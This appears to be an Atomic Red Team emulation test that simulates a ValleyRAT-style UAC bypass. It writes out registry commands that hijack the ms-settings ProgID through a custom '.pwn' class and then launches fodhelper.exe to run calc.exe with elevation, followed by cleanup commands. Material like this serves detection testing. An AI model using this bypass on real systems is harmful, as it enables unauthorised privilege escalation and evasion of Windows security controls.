# Converted from Atomic Red Team - Abuse Elevation Control Mechanism: Bypass User Account Control
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1548.002
# Original auto_generated_guid: b6f4645c-34ea-4c7c-98f2-d5a2747efb08

---
api_version: 2.0
uuid: 024b21a5-5f6f-4e99-b181-f865beecc6a1
name: UAC bypassed by Utilizing ProgIDs registry
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  This atomic designed to simulate the UAC bypassed made by ValleyRAT by adding customized ProgIDs registry entry.

mitre:
  tactics:
    - TA0004 Privilege Escalation
    - TA0005 Defense Evasion
  techniques:
    - T1548 Abuse Elevation Control Mechanism
  subtechniques:
    - T1548.002 Bypass User Account Control

requirements:
  platforms:
    - os: windows
  superuser: false

steps:
  - name: bypass_uac_progids
    executor: cmd.exe
    inline: |
      reg add "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /d "C:\Windows\System32\calc.exe" /f
      reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /d ".pwn" /f
      echo Triggering fodhelper.exe for potential privilege escalation...
      start fodhelper.exe
    cleanup:
      executor: cmd.exe
      inline: |
        reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
        reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
